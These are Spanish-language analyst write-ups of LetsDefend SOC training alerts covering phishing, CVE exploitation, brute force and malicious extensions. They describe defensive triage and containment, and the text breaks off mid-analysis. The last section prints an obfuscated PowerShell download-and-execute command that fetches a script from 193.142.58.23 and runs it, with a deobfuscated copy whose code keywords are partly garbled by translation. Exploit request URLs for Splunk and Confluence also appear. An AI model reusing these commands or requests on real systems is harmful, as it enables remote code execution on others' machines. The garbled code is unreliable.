# LETS DEFEND

## **SOC251 — Quishing Detected (QR Code Phishing)**

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled.png)

## **Datos de la alerta:**

**EventID :** 214

**Event Time :** Jan, 01, 2024, 12:37 PM

**Rule :** SOC251 — Quishing Detected (QR Code Phishing)

**Level :** Security Analyst

**SMTP Address :** 158.69.201.47

**Source Address :** security@microsecmfa.com

**Destination Address :** Claire@letsdefend.io

**E-mail Subject :** New Year’s Mandatory Security Update: Implementing Multi-Factor Authentication (MFA)

**Device Action :** Allowed

En primer lugar, verificaremos el contenido del correo electrónico anterior para ver e investigar el código QR que se detectó como malicioso.

Comprobamos la dirección IP de la dirección SMTP 158.69.201.47

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%201.png)

Realicemos una búsqueda por remitente para poder ver si hubo varios correos electrónicos de este remitente.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%202.png)

"Solamente existe un correo electrónico proveniente de este remitente, y es el mencionado en la alerta. Se permitió su entrega al usuario."

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%203.png)

No hay enlaces web en el mensaje, así que debemos prestar atención al código QR adjunto. Después de descargar y escanear el código QR, obtenemos una URL. 

Para analizar el código QR, podemos usar CyberChef en esta dirección: [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%204.png)

```jsx
https://ipfs.io/ipfs/Qmbr8wmr41C35c3K2GfiP2F8YGzLhYpKpb4K66KU6mLmL4#
```

Ahora vamos a verificar la URL en VirusTotal.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%205.png)

Dado que confirmamos que la URL es maliciosa y corresponde a una página falsa de inicio de sesión de Microsoft, regresemos a la vista del correo electrónico en LetsDefend y eliminémoslo de la bandeja de entrada del usuario para evitar posibles daños.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%206.png)

Ahora que hemos eliminado el correo electrónico y confirmado que la URL en el código QR es peligrosa, debemos verificar si el usuario accedió a ella. 

Vamos a Endpoints Security para revisar la dirección IP de "Claire".

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%207.png)

Claire IP: 172.16.17.181

Vamos a dirigirnos a Gestión de Registros y buscar con la dirección IP de Claire.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%208.png)

Podemos buscar si algún dispositivo, posiblemente móvil, en la red accedió a la URL mediante la búsqueda de la dirección IP de origen en la gestión de registros.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%209.png)

209.94.90.1

Vamos a dirigirnos a la gestión de registros.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2010.png)

No hay registros relacionados con esa dirección IP, y los códigos QR suelen escanearse con teléfonos. Volvamos a la seguridad de los puntos finales y aislemos el equipo para evitar que cualquier actividad maliciosa afecte al sistema si el usuario accedió a la URL peligrosa.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2011.png)

Recurriremos a los Playbook para seguir adelante:

Este phishing tiene como objetivo confirmar las credenciales.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2012.png)

El remitente del correo electrónico es externo/la URL del código QR es externa.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2013.png)

Hemos comprobado previamente que la IP es maliciosa en Virustotal

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2014.png)

Verificamos si alguien más recibió este correo electrónico y "Claire" fue el único usuario afectado.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2015.png)

Ya contuvimos al anfitrión.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2016.png)

Artifacts:

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2017.png)

Con esto terminaríamos

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2018.png)

## SOC250 - APT35 HyperScrape Data Exfiltration Tool Detected

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2019.png)

Esta alerta está relacionada la herramienta llamada HYPERSCRAPE que se usa para robar datos de usuarios de cuentas de Gmail, Yahoo! y Microsoft Outlook.

Empezaremos con el playbook en sí:

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2020.png)

A continuación se muestra la información que nos han facilitado:

**IP Address :** 172.16.17.72

**Hostname :** Arthur

**Process Name :** EmailDownloader.exe

Pasaremos a recolectar datos:

Revisemos la página Administración de registros para ver si hay un registro para la alerta

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2021.png)

Tenemos registros asociados con la dirección IP de nuestro equipo.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2022.png)

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2023.png)

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2024.png)

Ahora deberíamos ver el apartado Endpoint del Arthur.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2025.png)

Aquí vemos la descarga de .exe

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2026.png)

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2027.png)

como se menciona antes, la herramienta HYPERSCRAPE se utiliza para robar datos del usuario.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2028.png)

Como vemos la IP es externa: 136.243.108.14

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2029.png)

Buscamos las direcciones IP en la página de Virustotal y de información sobre amenazas y resultó ser externa y maliciosa:

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2030.png)

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2031.png)

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2032.png)

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2033.png)

Revisamos en Endpoitn Security, Log Management y en Email Security y solo fue Arthur el afectado.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2034.png)

Como el ataque fue exitoso, aislamos el dispositivo

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2035.png)

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2036.png)

Con esto daríamos por concluido el playbook.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2037.png)

## SOC239 - Remote Code Execution Detected in Splunk Enterprise

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2038.png)

Esta alerta es sobre **CVE-2023–46214** . La vulnerabilidad se debe a que las versiones **de Splunk Enterprise** inferiores **a 9.0.7** y **9.1.2 no desinfectan de forma segura las transformaciones de lenguaje de hojas de estilos extensibles ( XSLT** ) proporcionadas por el usuario . Esto significa que un atacante puede cargar XSLT malicioso que puede resultar en la ejecución remota de código (RCE) en la instancia de Splunk Enterprise.

Primero, comencemos creando un playbook.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2039.png)

**Source IP Address :** 180.101.88.240

**Destination IP Address :** 172.16.20.13

**Source port :** 54321

**Destination port :** 8000

**Hostname :** Splunk Enterprise

**Requested URL :** [http://18.219.80.54:8000/en-US/splunkd/__upload/indexing/preview?output_mode=json&props.NO_BINARY_CHECK=1&input.path=shell.xsl](http://18.219.80.54:8000/en-US/splunkd/__upload/indexing/preview?output_mode=json&props.NO_BINARY_CHECK=1&input.path=shell.xsl)

Primero, busco la dirección 180.101.88.240 en **Virustotal. En donde comprobamos que es maliciosa**

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2040.png)

Y también revisé Gestión de registros y encontré el siguiente registro.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2041.png)

Según los resultados que obtuvimos de los registros de Virustotal, podemos decir que el tráfico es **malicioso** .

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2042.png)

Tenemos el archivo shell.zip que lo investigamos. Lo descomprimí y me dio dos archivos como los siguientes: archivo **script(.sh)** y . archivo **xsl** :

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2043.png)

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2044.png)

Según lo observado, parece que este código representa un intento de ataque de inyección de entidad externa XML (XXE) en lugar de una transformación XSLT legítima.

Basándonos en la información proporcionada, podemos concluir que este archivo ejecuta un ataque de inyección XML.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2045.png)

He buscado artifacts asociados a la alerta como la IP de origen, la IP de destino o el nombre del servidor, pero no parece haber nada conectado.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2046.png)

La dirección de origen 180.101.88.240 de la alerta está ubicada en la red externa de una empresa china. Sin embargo, la dirección de destino 172.16.20.13 es interna, perteneciente a Splunk Enterprise.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2047.png)

Vemos que la acción del dispositivo está ”allowed” , por lo tanto, el ataque fue exitoso.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2048.png)

El dispositivo debe estar aislado para restringir al atacante y por lo tanto contenemos el dispositivo relevante

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2049.png)

Artifacts

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2050.png)

Como descubrimos que el ataque fue exitoso, un analista más experimentado **necesita una escalada de nivel 2**

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2051.png)

Con esto concluimos el playbook.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2052.png)

## SOC227 - Microsoft SharePoint Server Elevation of Privilege - Possible CVE-2023-29357 Exploitation

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2053.png)

La vulnerabilidad CVE-2023–29357 es una vulnerabilidad crítica de escalada de privilegios que, cuando se combina con otras vulnerabilidades, podría conducir a la ejecución remota de código. Una puntuación CVSS de 9,8 (crítico) an.

Primero, comencemos creando un playbook:

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2054.png)

Como se muestra arriba, necesitamos recopilar direcciones IP, la dirección del tráfico, el nombre de host, etc.

**Dirección IP de origen:** 39.91.166.222

**Dirección IP de destino:** 172.16.17.233

**Nombre de host:** MS-SharePointServer

**URL solicitada:** /_api/web/siteusers

Primero, busco la dirección 39.91.166.222 en **Virustotal. La dirección IP es maliciosa**

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2055.png)

Luego revisamos la pantalla de Administración de registros y encontramos los siguientes registros.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2056.png)

Según los resultados que obtuvimos de Virustotal y los registros, podemos decir que el tráfico es malicioso**.**

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2057.png)

El tipo de ataque que estamos investigando no pertenece a ninguno de los anteriores.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2058.png)

He buscado artifacts asociados a la alerta como la IP de origen, la IP de destino o el nombre del servidor, pero no parece haber nada conectado.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2059.png)

La dirección de origen 39.91.166.222 de la alerta pertenece a la red externa de la empresa. Pero 172.16.17.233 es la dirección de destino interna

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2060.png)

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2061.png)

El ataque fue **exitoso** porque descubrí que el atacante accedió a las URL /currentuser y /siteusers del sitio.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2062.png)

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2063.png)

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2064.png)

Como se muestra abajo, el dispositivo debe estar aislado para restringir al atacante y, por lo tanto, contenemos el dispositivo correspondiente.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2065.png)

Como descubrimos que el ataque tuvo éxito, un analista más experimentado necesitamos una escalada de nivel 2 

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2066.png)

Con esto concluimos el playbook.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2067.png)

## SOC235 - Atlassian Confluence Broken Access Control 0-Day CVE-2023-22515

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2068.png)

CVE-2023–22515 representa una amenaza de seguridad crítica para las instancias de Atlassian Confluence, ya que permite que atacantes maliciosos obtengan acceso no autorizado. Esta vulnerabilidad permite a los atacantes crear cuentas de administrador de Confluence sin la autorización adecuada, lo que puede comprometer los sistemas de las víctimas.

Empezaremos con el playbook:

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2069.png)

Recopilación de datos:

**Source Ip Address:** 43.130.1.222

**Destination Ip Address:** 172.16.17.234

**Requested URL:** /server-info.action bootstrapStatusProvider.applicationConfig.setupComplete=false

**Hostname :** Confluence Data Center v8.0.3

Buscamos la dirección de origen, 43.130.1.222, en Virustotal. El resultado muestra que la dirección IP es maliciosa.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2070.png)

El siguiente paso es examinar el tráfico HTTP. Después de especificar la IP de origen como **43.130.1.222** y la IP de destino como **172.16.17.234** en Gestión de registros, verifiqué los resultados y encontré tres registros.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2071.png)

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2072.png)

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2073.png)

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2074.png)

Entonces, podemos ver que el código de estado HTTP para la URL solicitada que se mencionó anteriormente "/serverinfo.actionbootstrapStatusProvider.applicationConfig.setupComplete=false" es 200, lo que significa que fue exitoso.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2075.png)

Los resultados obtenidos confirman que el tráfico es malicioso.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2076.png)

Según los resultados de la investigación, ninguno de los tipos de ataque especificados se alinea con el escenario en cuestión. Por lo tanto, se toma la decisión de elegir la categoría 'Other'.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2077.png)

Busqué elementos anteriores como IP de origen, IP de destino, nombre del servidor en Email Security, no hay nada interesante.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2078.png)

La IP de origen, 43.130.1.222, corresponde a la dirección IP pública de una empresa externa, mientras que la IP de destino, 172.16.17.234, pertenece a un host dentro de la red privada de la empresa.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2079.png)

Podemos ver que la **acción del dispositivo** es **"Allowed",** lo que significa que el dispositivo no tomó ninguna medida para prevenir o bloquear las actividades asociadas. Además de eso, el código de estado HTTP para la URL solicitada (/server-info.actionbootstrapStatusProvider.applicationConfig.setupComplete=false) es 200.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2080.png)

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2081.png)

Como se indica arriba de la imagen, la contención implica aislar y limitar rápidamente las consecuencias de una amenaza identificada, detener su propagación y mejorar la seguridad general del sistema. Por lo tanto, es necesario aislar el dispositivo comprometido. La dirección IP del dispositivo comprometido es 172.16.17.234. Procedamos a aislar este dispositivo en particular.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2082.png)

En esta situación, escalar al Nivel 2 es crucial ya que poseen la experiencia para realizar una investigación más profunda sobre el ataque exitoso y responder con mayor efectividad.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2083.png)

Con esto concluimos el playbook.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2084.png)

## SOC210 - Possible Brute Force Detected on VPN

[https://medium.com/@suhani.patel.1701/soc210-possible-brute-force-detected-on-vpn-a3a7be0d29f8](https://medium.com/@suhani.patel.1701/soc210-possible-brute-force-detected-on-vpn-a3a7be0d29f8)

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2085.png)

Comencemos con un análisis inicial:

Verificaremos la dirección IP de origen en la administración de registros

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2086.png)

Los dos registros anteriores se generaron uno tras otro e incluso antes de estos dos, hubo muchos intentos de inicio de sesión para conectarse a la VPN que involucraban nombres de usuario incorrectos. Entonces, esto definitivamente indica un ataque de fuerza bruta, ya que hubo un intento de inicio de sesión exitoso después de varios intentos fallidos.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2087.png)

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2088.png)

Ahora buscaremos al usuario Mane en el EndPiont Security para ver si hubo procesos sospechosos, actividades de red o historial de comandos.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2089.png)

Se termino concluyendo ninguna de las actividades del sistema ocurrió después de que se generó la alerta, es decir, después de que el inicio de sesión fue exitoso.

Consiguiente buscaremos la ip de origen en Virustotal y en AbuseIPDB.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2090.png)

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2091.png)

Está marcada como maliciosa y también clasificada en la categoría de fuerza bruta.

Una vez hecho esto empezaremos el playbook:

Si buscamos la dirección IP de origen en EPS, no encontramos ningún dispositivo asociado a ella

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2092.png)

Como hemos visto en la busqueda en Virustotal la IP es sospechosa.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2093.png)

Si recibio solicitudes de la dirección IP atacante.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2094.png)

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2095.png)

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2096.png)

Según nuestro análisis inicial de la gestión de registros, podemos decir que el ataque fue exitoso*.*

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2097.png)

Como el intento de inicio de sesión fue exitoso, necesitamos contener el dispositivo

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2098.png)

Artifacts:

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%2099.png)

Con esto concluimos el playbook

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20100.png)

## SOC202 - FakeGPT Malicious Chrome Extension

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20101.png)

Empezaremos iniciando el playbook

Pondremos una descripción del tipo de incidente.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20102.png)

Comenzaremos a buscar registros/evidencias.

Primero veremos el Endpoint Security de la Ip Interna

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20103.png)

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20104.png)

No hay mucho en Endpoint Security que indique que fue puesto en cuarentena. La línea de comando de alerta también indica que se descargó en la máquina chrome.exe: argumento único C:\Users\LetsDefend\Download\hacfaophiklaeolhnmckojjjjbnappen.crx

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20105.png)

A continuación, tenemos el hash en la alerta para que podamos usarlo para buscarlo, por ejemplo, en Virustotal.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20106.png)

Ningún motor lo detecta como malicioso, pero observamos en la pestaña Comunidad y descubrimos que es una extensión falsa de Chatgpt Chrome.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20107.png)

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20108.png)

Con esto podemos concluir que el Malware realmente si es malicioso

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20109.png)

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20110.png)

Al mirar en Gestión de registros podemos encontrar esto, así que sí, se accedió.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20111.png)

Como el se accedió finalmente se pondrá en contención el dispositivo.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20112.png)

Con esto concluimos el playbook.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20113.png)

## SOC175 - PowerShell Found in Requested URL - Possible CVE-2022-41082 Exploitation

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20114.png)

Al comenzar nuestro análisis, notamos inmediatamente que el motivo de activación de la alerta es: " La URL de solicitud contiene PowerShell ".

Esto significa que deberíamos ver algunas solicitudes en el puerto 443 mediante la dirección IP de origen 58.237.200.6.

Pero primero verifiquemos la dirección IP de origen 58.237.200.6:

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20115.png)

La dirección IP está marcada como maliciosa y está conectada a una empresa de telecomunicaciones de Corea del Sur.

El siguiente paso es comprobar los registros. En la página de administración de registros vemos que se realizaron múltiples solicitudes desde la IP 58.237.200.6 a la dirección IP 172.16.20.8

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20116.png)

Si abrimos los registros sin formato, vemos que hay un intento de utilizar la vulnerabilidad Proxy(no)Shell:

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20117.png)

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20118.png)

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20119.png)

Podemos ver en los registros que todos los intentos están bloqueados.

Una vez hecho esto empezaremos el playbook:

Como hemos visto anteriormente es malicioso.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20120.png)

El tipo de ataque es ***otro,*** ya que la vulnerabilidad aprovecha **la ejecución remota de código** cuando el atacante puede acceder a Exchange PowerShell

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20121.png)

Podemos decir que no está previsto. No hay evidencia de correos electrónicos ni de posibles ejercicios relacionados con la simulación.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20122.png)

La dirección del tráfico es Internet → Empresa como hemos visto analizando los logs.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20123.png)

La respuesta es no ya que hemos visto que todos los dispositivos lo tienen bloqueado.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20124.png)

No, no necesitamos una escalada de nivel 2 ya que el ataque no tiene éxito.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20125.png)

Con esto concluiríamos el playbook.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20126.png)

## SOC164 - Suspicious Mshta Behavior

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20127.png)

EventID: 114

Event Time: Mar, 05, 2022, 10:29 AM

Rule: SOC164 - Suspicious Mshta Behavior

Level: Security Analyst

Hostname: Roberto

IP Address: 172.16.17.38

Related Binary: mshta.exe

Binary Path: C:/Windows/System32/mshta.exe

Command Line: C:/Windows/System32/mshta.exe C:/Users/Roberto/Desktop/Ps1.hta

MD5 of Ps1.hta: 6685c433705f558c5535789234db0e5a

Alert Trigger Reason:Low reputation hta file executed via mshta.exe

EDR Action: Allowed

La alerta indica un comportamiento sospechoso de mshta relacionado con la ejecución de " mshta.exe " en el host llamado " Roberto ".

Mshta.exe es un componente de software del servidor de aplicaciones Microsoft HTML de Microsoft. Se encuentra en la ruta del archivo “C:\Windows\System32\mshta.exe” y se ejecuta en cmd.exe o powershell.exe. Mshta.exe recibe su nombre como abreviatura de "Aplicaciones HTML de Microsoft".

"mshta.exe" es un componente legítimo de Windows que se utiliza para ejecutar archivos de aplicaciones HTML (.hta), que se pueden utilizar para crear aplicaciones GUI utilizando HTML y lenguajes de secuencias de comandos como JavaScript o VBScript, pero también se pueden utilizar para evitar las defensas de la lista blanca de aplicaciones. y configuración de seguridad del navegador.

La alerta muestra que “mshta.exe” se ejecutó en la terminal, con la línea de comando “ C:/Windows/System32/mshta.exe C:/Users/Roberto/Desktop/Ps1.hta ”.

El hash MD5 de Ps1.hta ya se proporciona en el informe de alerta, lo que puede ser útil para análisis posteriores. Busquemos el archivo en VirusTotal.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20128.png)

Como podemos ver, muchos proveedores de seguridad identifican el archivo como malicioso. Decidimos que se necesita más investigación para evaluar la naturaleza y la intención del archivo "Ps1.hta" y su comportamiento cuando se ejecuta. Vayamos a la pestaña Endpoint Security para verificar los comandos y procesos de terminal sospechosos.

Buscamos a Roberto,

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20129.png)

Nos vamos a su historial:

El historial del terminal de Roberto revela una serie de comandos sospechosos ejecutados el 5 de marzo de 2021 a las 10:30 a.m. Analicemos los comandos.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20130.png)

```jsx
C:/Windows/System32/mshta.exe C:/Users/roberto/Desktop/Ps1.hta
```

Este primer comando ejecuta **mshta.exe** con el argumento C:/Users/roberto/Desktop/Ps1.hta. Este argumento se utiliza para abrir y ejecutar el archivo HTA ubicado en el sistema de Roberto.

```jsx
C:/Windows/System32/WindowsPowerShell/v1. 0 /powershell.exe función  H1 ( $i ) { $r = '' ; for ( $n = 0 ; $n -Lt $i .LengtH; $n += 2 ){ $r += [cHar][ int ]( '0x' + $i . Subcadena ( $n , 2 ))} devolver  $r }; $H2 = ( nuevo - objeto ( '{1}{0}{2}' -f 'WebCL' , 'net.' , 'ient' )); $H3 = H1'446f776E' ; $H4 = H1 '6C6f' ; $H5 = H1 '616473747269' ; $H6 = H1 '6E67' ; $H7 = $H3 + $H4 + $H5 + $H6 ; $H8 = $H2 . $H7 ( 'http://193.142.58.23/Server.txt' );iEX $H8
```

El segundo comando ejecuta un script de PowerShell. El código está ofuscado e intenta ocultar el verdadero propósito del código. A continuación se muestra el código desenfuscado

```jsx
función  H1 ( $i ) {
     $r = '' 
    for ( $n = 0 ; $n -lt $i .Longitud; $n += 2 ) {
         $r += [char][ int ]( '0x' + $i . Subcadena ( $n , 2 ))
    }
     return  $r
 }

 $H2 = ( nuevo - objeto ( '{1}{0}{2}' -f 'WebCL' , 'net.' , 'ient' ) )
 $H3 = H1 '446f776E' 
$H4 = H1 '6C6f' 
$H5 = H1 '616473747269' 
$H6 = H1 '6E67' 
$H7 = $H3 + $H4 + $H5 + $H6 
$H8 = $H2 . $H7 ( 'http://193.142.58.23/Server.txt' )
iEX $H8
```

El script contiene una función llamada H1($i) que recibe una cadena de entrada "$i", la interpreta como valores hexadecimales, los convierte a caracteres ASCII y los concatena.

Luego, crea un nuevo objeto llamado $H2 utilizando el cmdlet "New-Object". Sin embargo, los parámetros 'WebCL', 'net.' y 'ient' se concatenan para formar el nombre de clase de PowerShell "System.Net.WebClient".

